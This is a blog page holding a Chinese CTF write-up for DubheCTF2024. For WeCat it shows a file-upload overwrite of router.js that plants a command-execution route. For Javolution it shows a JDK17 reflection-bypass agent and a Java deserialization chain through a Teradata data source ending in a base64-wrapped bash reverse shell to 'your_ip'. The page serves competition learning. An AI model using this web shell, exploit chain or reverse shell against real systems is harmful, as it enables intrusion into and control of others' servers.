@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            DubheCTF2024 wp
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="WeCat"><a href="#WeCat" class="headerlink" title="WeCat"></a>WeCat</h1><p>一个nodejs的服务，目的很明确，要rce。</p>
+<p>文件上传？就算能传js文件也执行不了呀，先忽略。</p>
+<p>前两个小时在熟悉代码，大部分时间在看webSocket，因为没接触过，想看看这里有没有rce。结果没有。</p>
+<p>有mongodb服务，但就算数据库有洞，打的也是数据库在的机，不在当前web机，所以直接忽略。</p>
+<p>后面没别的路可走，看看dockerfile，npm dev启动的，猜测这种模式是热加载文件的，文件或者目录有变化立刻加载。本地起了个，确实是这样。</p>
+<p>所以思路就是上传文件，覆盖原有文件，添加一个恶意路由，再rce。</p>
+<p>上传文件看能不能覆盖，可以。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/DubheCTF2024/image-20240319103026960.png" alt="image-20240319103026960.png"></p>
+<p>覆盖这个到原有的router.js即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const router = require(&#x27;@koa/router&#x27;)()</span><br><span class="line">const commonRouter = require(&#x27;./commonRouter&#x27;)</span><br><span class="line">const routeAdmin = require(&#x27;./admin&#x27;)</span><br><span class="line">const routeLogin = require(&#x27;./login&#x27;)</span><br><span class="line">const routeUpload = require(&#x27;./upload&#x27;)</span><br><span class="line"></span><br><span class="line">router</span><br><span class="line">  .use(routeLogin)</span><br><span class="line">  .use(commonRouter)</span><br><span class="line">  .use(routeUpload)</span><br><span class="line">  .use(routeAdmin)</span><br><span class="line"></span><br><span class="line">router.post(&#x27;/wechatAPI/test&#x27;, async (ctx) =&gt; &#123;</span><br><span class="line">  ctx.body = &quot;&quot;</span><br><span class="line">  await new Promise(resolve =&gt; &#123;</span><br><span class="line">    require(&quot;child_process&quot;).exec(ctx.request.body.cmd, (error, stdout, stderr) =&gt; &#123;</span><br><span class="line">      if (error) &#123;</span><br><span class="line">        ctx.body += error</span><br><span class="line">        resolve()</span><br><span class="line">      &#125;</span><br><span class="line">      ctx.body += stdout + stderr</span><br><span class="line">      resolve()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">module.exports = router</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通了</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/DubheCTF2024/image-20240319103046400.png" alt="image-20240319103046400.png"></p>
+<h1 id="Javolution"><a href="#Javolution" class="headerlink" title="Javolution"></a>Javolution</h1><p>先升级，到达50级了！</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1.95.54.152:40957/pal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># battle depresso up 10 level</span></span><br><span class="line">url1 = url + <span class="string">&quot;/battle/depresso&quot;</span></span><br><span class="line"><span class="built_in">print</span>(url1)</span><br><span class="line"><span class="built_in">print</span>(requests.get(url1).text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="comment"># capture Mammorest</span></span><br><span class="line">url3 = url + <span class="string">&quot;/capture?name=mammorest&quot;</span></span><br><span class="line"><span class="built_in">print</span>(requests.get(url3).text)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">url4 = url + <span class="string">&quot;/capture?name=Grizzbolt&quot;</span></span><br><span class="line"><span class="built_in">print</span>(requests.get(url4).text)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># change defense and hp</span></span><br><span class="line">url2 = url + <span class="string">&quot;/cheat?hp=6000&amp;defense=-2147483645&quot;</span></span><br><span class="line"><span class="built_in">print</span>(requests.get(url2).text)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">battle_jetragon = url + <span class="string">&quot;/battle/jetragon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(requests.get(battle_jetragon).text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">battle_flag = url + <span class="string">&quot;/battle/flag&quot;</span></span><br><span class="line"><span class="built_in">print</span>(requests.get(battle_flag).text)</span><br><span class="line"></span><br><span class="line">show = url + <span class="string">&quot;/show&quot;</span></span><br><span class="line"><span class="built_in">print</span>(requests.get(show).text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/DubheCTF2024/image-20240319102837138.png" alt="image-20240319102837138.png"></p>
+<p>弄个子域名，记录值为127.0.0.1，可以过host。炫酷</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/DubheCTF2024/image-20240319102737345.png" alt="image-20240319102737345.png"></p>
+<p>jdk17。我草</p>
+<p>Jdk 17 原本是无法反射修改私有属性的，我实现了一个Agent，改掉jdk17多出来的判断是否可以访问属性的方法，可以修改私有属性了。</p>
+<p>下面是agent代码，顺便把POJO也加进去了</p>
+<p>MyAgent</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public class MyAgent &#123;</span><br><span class="line"></span><br><span class="line">    public static void premain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException &#123;</span><br><span class="line"></span><br><span class="line">        inst.addTransformer(new MyClassFileTransformer(),<span class="literal">true</span>);</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>.equals(loadedClass.getName()) || <span class="string">&quot;java.lang.reflect.Field&quot;</span>.equals(loadedClass.getName()))&#123;</span><br><span class="line">                //重新transform</span><br><span class="line">                inst.retransformClasses(loadedClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>MyClassFileTransformer</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public class MyClassFileTransformer implements ClassFileTransformer &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer)&#123;</span><br><span class="line"></span><br><span class="line">        String target1 = <span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>;</span><br><span class="line">        String target4 = <span class="string">&quot;java.lang.reflect.Field&quot;</span>;</span><br><span class="line"></span><br><span class="line">        String className2 = className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className2.equals(target1)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span>+target1);</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            try &#123;</span><br><span class="line"></span><br><span class="line">                CtClass c = pool.getCtClass(className2);</span><br><span class="line">                System.out.println(<span class="string">&quot;hhhh&quot;</span>);</span><br><span class="line">                CtMethod ctMethod = c.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line"></span><br><span class="line">                c.removeMethod(ctMethod);</span><br><span class="line">                byte[] bytes = c.toBytecode();</span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="built_in">return</span> bytes;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className2.equals(target4)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span>+target4);</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            try &#123;</span><br><span class="line"></span><br><span class="line">                CtClass c = pool.getCtClass(className2);</span><br><span class="line">                System.out.println(<span class="string">&quot;hhhh&quot;</span>);</span><br><span class="line">                CtMethod ctMethod = c.getDeclaredMethod(<span class="string">&quot;setAccessible&quot;</span>);</span><br><span class="line"></span><br><span class="line">                ctMethod.setBody(<span class="string">&quot;&#123;        java.lang.reflect.AccessibleObject.checkPermission();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        if (false) checkCanSetAccessible(Reflection.getCallerClass());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        setAccessible0(<span class="variable">$1</span>);&#125;&quot;</span>);</span><br><span class="line">                byte[] bytes = c.toBytecode();</span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="built_in">return</span> bytes;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后加载agent，和java8一样修改私有属性就行。</p>
+<p>Import TemplatesImpl，XString，提示程序包不存在，是因为JDK9之后多了一个module的问题，我们的module无法访问TemplatesImpl所在的module。</p>
+<p>BadAttr的val属性，在java8是Object类型，在jdk17中是String类型。</p>
+<p>链子入口EventListenerList，readObject-&gt;toString。</p>
+<p>getter用POJONode。注意调getter时，要套一层JDKDynamicProxy，不然会报module错误，问就是测出来的。</p>
+<p>还差一个getter -&gt; rce。</p>
+<p>目前的进度：能收到靶机的TeraDataSource#getConnection，就是不知道如何利用</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/DubheCTF2024/image-20240319102717544.png" alt="image-20240319102717544.png"></p>
+<p>后面debug源码，发现了RCE的位置。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/DubheCTF2024/image-20240319102700696.png" alt="image-20240319102700696.png"></p>
+<p>路线：</p>
+<p>TeraDataSourceBase.createNewConnection –&gt; ConnectionFactory.createConnection new RawConnection —&gt; RawConnection构造函数引用父类构造GenericTeradataConnection  —&gt; GenericTeradataConnection构造函数—&gt;RCE</p>
+<p>继续debug，然后自己搭数据库环境，甚至自己抓包，写恶意服务端，越到后面越不知道服务端怎么写。最后发现有现成的：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p>
+<p>我草。搓服务端搓了5个小时，给我们搓红温了。</p>
+<p>搓的一半服务端，没啥用，纪念一下。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/DubheCTF2024/image-20240319102644156.png" alt="image-20240319102644156.png"></p>
+<p>服务端起了直接发送反序列化数据过去就行。</p>
+<p>exp</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception, IllegalAccessException &#123;</span><br><span class="line">    Field field = getField(obj.getClass(), fieldname);</span><br><span class="line">    <span class="keyword">if</span> (field == null) &#123;</span><br><span class="line">        throw new Exception(<span class="string">&quot;field &quot;</span> + fieldname + <span class="string">&quot;not found!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public static Field getField(Class&lt;?&gt; clazz, String fieldName) &#123;</span><br><span class="line">    Field field = null;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        field = clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    &#125; catch (NoSuchFieldException var4) &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.getSuperclass() != null) &#123;</span><br><span class="line">            field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> field;</span><br><span class="line">&#125;</span><br><span class="line">public static Object unserialize(byte[] bytes) throws Exception &#123;</span><br><span class="line">    ObjectInputStream <span class="keyword">in</span> = new ObjectInputStream(new ByteArrayInputStream(bytes));</span><br><span class="line">    <span class="built_in">return</span> in.readObject();</span><br><span class="line">&#125;</span><br><span class="line">public static byte[] serialize(Object obj) throws Exception &#123;</span><br><span class="line">    ByteArrayOutputStream bytes = new ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream out = new ObjectOutputStream(bytes);</span><br><span class="line">    out.writeObject(obj);</span><br><span class="line">    <span class="built_in">return</span> bytes.toByteArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Object getPOJONodeStableProxy(Object templatesImpl) throws Exception &#123;</span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">    cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    AdvisedSupport advisedSupport = new AdvisedSupport();</span><br><span class="line">    advisedSupport.setTarget(templatesImpl);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)cons.newInstance(advisedSupport);</span><br><span class="line">    Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;DataSource.class&#125;, handler);</span><br><span class="line">    <span class="built_in">return</span> proxyObj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static void main( String[] args )throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    PalDataSource palDataSource = new PalDataSource();</span><br><span class="line">    Object pojoNodeStableProxy = getPOJONodeStableProxy(palDataSource);</span><br><span class="line">    POJONode jsonNodes = new POJONode(pojoNodeStableProxy);</span><br><span class="line">    EventListenerList list = new EventListenerList();</span><br><span class="line"></span><br><span class="line">    UndoManager manager = new UndoManager();</span><br><span class="line">    Vector vector = (Vector) Util.getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">    vector.add(jsonNodes);</span><br><span class="line">    setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, new Object[]&#123;InternalError.class, manager&#125;);</span><br><span class="line"></span><br><span class="line">    System.out.println(Util.URLEncode(Base64.getEncoder().encodeToString(serialize(list))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PalDataSource</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public class PalDataSource extends TeraDataSource &#123;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="title">PalDataSource</span></span>()&#123;</span><br><span class="line">        String cmd = <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/your_ip/16666 0&gt;&amp;1&quot;</span>;</span><br><span class="line">        String <span class="built_in">command</span> = <span class="string">&quot;bash -c &#123;echo,&quot;</span>+Base64.getEncoder().encodeToString(cmd.getBytes())+<span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="built_in">command</span>);</span><br><span class="line">        setBROWSER(<span class="built_in">command</span>);</span><br><span class="line">        setLOGMECH(<span class="string">&quot;BROWSER&quot;</span>);</span><br><span class="line">        setDSName(<span class="string">&quot;your_ip&quot;</span>);</span><br><span class="line">        setDbsPort(<span class="string">&quot;10250&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override // com.teradata.jdbc.TeraDataSource, javax.sql.DataSource</span><br><span class="line">    public Connection getConnection(String username, String password) throws SQLException &#123;</span><br><span class="line">        <span class="built_in">return</span> super.getConnection(username, password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override // com.teradata.jdbc.TeraDataSourceBase, javax.sql.CommonDataSource</span><br><span class="line">    public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;</span><br><span class="line">        <span class="built_in">return</span> null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/DubheCTF2024/image-20240319102628287.png" alt="image-20240319102628287.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WeCat"><span class="toc-text">WeCat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Javolution"><span class="toc-text">Javolution</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
